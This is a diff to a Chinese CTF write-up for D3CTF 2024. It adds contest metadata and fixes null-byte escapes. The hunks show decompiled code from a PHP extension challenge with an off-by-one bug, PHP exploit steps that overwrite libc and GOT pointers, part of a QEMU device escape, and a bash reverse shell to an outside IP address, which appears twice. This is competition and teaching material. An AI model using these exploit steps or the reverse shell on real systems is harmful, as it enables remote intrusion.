@@ -69,6 +69,8 @@ prerequisites:
 - /proc/self/mem 读写 + ASLR 关闭 + 自修改代码
 - pwntools 远程交互（remote/sh/sendline）
 - QEMU MMIO/PMIO 寄存器布局（addr/size/val）
+contest_normalized: "D3CTF"
+contest_year: 2024
 ---
 # D3CTF 2024 Writeup  –Polaris战队
 
@@ -196,7 +198,7 @@ int main(){    int mmio_fd;    size_t libc_addr = 0, system_addr;       �
 PwnShell
 
 unsigned __int64 __fastcall zif_addHacker(__int64 a1, zval *return_value){  __int64 v3; // rdi  __int64 index; // rdx MAPDST  char *p_type; // rax  chunk *v7; // r12  node *node; // rbx  char *buf; // rax  size_t arg1_len; // rdx  char *arg1_buf; // rsi  size_t end_char; // rax  zval *arg2; // [rsp+8h] [rbp-40h] MAPDST BYREF  zval *arg1; // [rsp+10h] [rbp-38h] BYREF  unsigned __int64 v16; // [rsp+18h] [rbp-30h]
-  v3 = *(unsigned int *)(a1 + 44);  v16 = __readfsqword(0x28u);  if ( (unsigned int)zend_parse_parameters(v3, &unk_2000, &arg1, &arg2) != -1 )  {    if ( arg1->u1.v.type == IS_STRING && arg2->u1.v.type == IS_STRING )    {      index = 0LL;      p_type = (char *)&chunkList[0].type;      do      {        if ( *p_type == UNUSED )          break;        ++index;        p_type += 16;      }      while ( index != 16 );      v7 = &chunkList[index];      node = (node *)_emalloc(arg2->value.str->len + 16);      buf = (char *)_emalloc(arg1->value.str->len);      node->buf = buf;      arg1_len = arg1->value.str->len;      arg1_buf = arg1->value.str->val;      node->size = arg1_len;      memcpy(buf, arg1_buf, arg1_len);      memcpy(node->arg2_string, arg2->value.str->val, arg2->value.str->len);      end_char = arg2->value.str->len;      v7->node = node;      v7->type = USED;      node->arg2_string[end_char] = ' ';       // off-by-one    }    else    {      return_value->u1.type_info = IS_NULL;    }  }  return v16 - __readfsqword(0x28u);}
+  v3 = *(unsigned int *)(a1 + 44);  v16 = __readfsqword(0x28u);  if ( (unsigned int)zend_parse_parameters(v3, &unk_2000, &arg1, &arg2) != -1 )  {    if ( arg1->u1.v.type == IS_STRING && arg2->u1.v.type == IS_STRING )    {      index = 0LL;      p_type = (char *)&chunkList[0].type;      do      {        if ( *p_type == UNUSED )          break;        ++index;        p_type += 16;      }      while ( index != 16 );      v7 = &chunkList[index];      node = (node *)_emalloc(arg2->value.str->len + 16);      buf = (char *)_emalloc(arg1->value.str->len);      node->buf = buf;      arg1_len = arg1->value.str->len;      arg1_buf = arg1->value.str->val;      node->size = arg1_len;      memcpy(buf, arg1_buf, arg1_len);      memcpy(node->arg2_string, arg2->value.str->val, arg2->value.str->len);      end_char = arg2->value.str->len;      v7->node = node;      v7->type = USED;      node->arg2_string[end_char] = '\\x00';       // off-by-one    }    else    {      return_value->u1.type_info = IS_NULL;    }  }  return v16 - __readfsqword(0x28u);}
 
 00000000 chunk           struc ; (sizeof=0x10, mappedto_24)00000000                                         ; XREF: .bss:
 chunkList/r00000000 node            dq ?                    ; offset00000008 type            dd ?0000000C field_C         dd ?00000010 chunk           ends0000001000000000 ; ---------------------------------------------------------------------------0000000000000000 node            struc ; (sizeof=0x11, mappedto_25)00000000 buf             dq ?                    ; offset00000008 size            dq ?00000010 arg2_string     db ?00000011 node            ends
@@ -265,7 +267,7 @@ echo "_emalloc_got_addr: ". hex64($_emalloc_got_addr)."n";
 echo "Step Threen";
 editHacker(3, p64($libc_so_6_addr + 0x4c490));
 editHacker(1, p64($heap_addr+0x80100));
-editHacker(3, "bash -c 'sh >& /dev/tcp/110.42.237.28/60105 0>&1' ");
+editHacker(3, "bash -c 'sh >& /dev/tcp/110.42.237.28/60105 0>&1'\\x00");
 echo "Endn";
 ?>
 
@@ -578,7 +580,7 @@ int main(){    int mmio_fd;    size_t libc_addr = 0, system_addr;       �
     pmio_write(20, system_addr);    pmio_write(24, system_addr/0x100000000);
     mmio_write(64, 0x6873);        return 0;}
 unsigned __int64 __fastcall zif_addHacker(__int64 a1, zval *return_value){  __int64 v3; // rdi  __int64 index; // rdx MAPDST  char *p_type; // rax  chunk *v7; // r12  node *node; // rbx  char *buf; // rax  size_t arg1_len; // rdx  char *arg1_buf; // rsi  size_t end_char; // rax  zval *arg2; // [rsp+8h] [rbp-40h] MAPDST BYREF  zval *arg1; // [rsp+10h] [rbp-38h] BYREF  unsigned __int64 v16; // [rsp+18h] [rbp-30h]
-  v3 = *(unsigned int *)(a1 + 44);  v16 = __readfsqword(0x28u);  if ( (unsigned int)zend_parse_parameters(v3, &unk_2000, &arg1, &arg2) != -1 )  {    if ( arg1->u1.v.type == IS_STRING && arg2->u1.v.type == IS_STRING )    {      index = 0LL;      p_type = (char *)&chunkList[0].type;      do      {        if ( *p_type == UNUSED )          break;        ++index;        p_type += 16;      }      while ( index != 16 );      v7 = &chunkList[index];      node = (node *)_emalloc(arg2->value.str->len + 16);      buf = (char *)_emalloc(arg1->value.str->len);      node->buf = buf;      arg1_len = arg1->value.str->len;      arg1_buf = arg1->value.str->val;      node->size = arg1_len;      memcpy(buf, arg1_buf, arg1_len);      memcpy(node->arg2_string, arg2->value.str->val, arg2->value.str->len);      end_char = arg2->value.str->len;      v7->node = node;      v7->type = USED;      node->arg2_string[end_char] = ' ';       // off-by-one    }    else    {      return_value->u1.type_info = IS_NULL;    }  }  return v16 - __readfsqword(0x28u);}
+  v3 = *(unsigned int *)(a1 + 44);  v16 = __readfsqword(0x28u);  if ( (unsigned int)zend_parse_parameters(v3, &unk_2000, &arg1, &arg2) != -1 )  {    if ( arg1->u1.v.type == IS_STRING && arg2->u1.v.type == IS_STRING )    {      index = 0LL;      p_type = (char *)&chunkList[0].type;      do      {        if ( *p_type == UNUSED )          break;        ++index;        p_type += 16;      }      while ( index != 16 );      v7 = &chunkList[index];      node = (node *)_emalloc(arg2->value.str->len + 16);      buf = (char *)_emalloc(arg1->value.str->len);      node->buf = buf;      arg1_len = arg1->value.str->len;      arg1_buf = arg1->value.str->val;      node->size = arg1_len;      memcpy(buf, arg1_buf, arg1_len);      memcpy(node->arg2_string, arg2->value.str->val, arg2->value.str->len);      end_char = arg2->value.str->len;      v7->node = node;      v7->type = USED;      node->arg2_string[end_char] = '\\x00';       // off-by-one    }    else    {      return_value->u1.type_info = IS_NULL;    }  }  return v16 - __readfsqword(0x28u);}
 00000000 chunk           struc ; (sizeof=0x10, mappedto_24)00000000                                         ; XREF: .bss:
 chunkList/r00000000 node            dq ?                    ; offset00000008 type            dd ?0000000C field_C         dd ?00000010 chunk           ends0000001000000000 ; ---------------------------------------------------------------------------0000000000000000 node            struc ; (sizeof=0x11, mappedto_25)00000000 buf             dq ?                    ; offset00000008 size            dq ?00000010 arg2_string     db ?00000011 node            ends
 static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC){#if ZEND_MM_STAT  do {    size_t size = heap->size + bin_data_size[bin_num];    size_t peak = MAX(heap->peak, size);    heap->size = size;    heap->peak = peak;  } while (0);#endif
@@ -613,7 +615,7 @@ echo "_emalloc_got_addr: ". hex64($_emalloc_got_addr)."n";
 echo "Step Threen";
 editHacker(3, p64($libc_so_6_addr + 0x4c490));
 editHacker(1, p64($heap_addr+0x80100));
-editHacker(3, "bash -c 'sh >& /dev/tcp/110.42.237.28/60105 0>&1' ");
+editHacker(3, "bash -c 'sh >& /dev/tcp/110.42.237.28/60105 0>&1'\\x00");
 echo "Endn";
 ?>
     #include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include #include <fcntl.h>
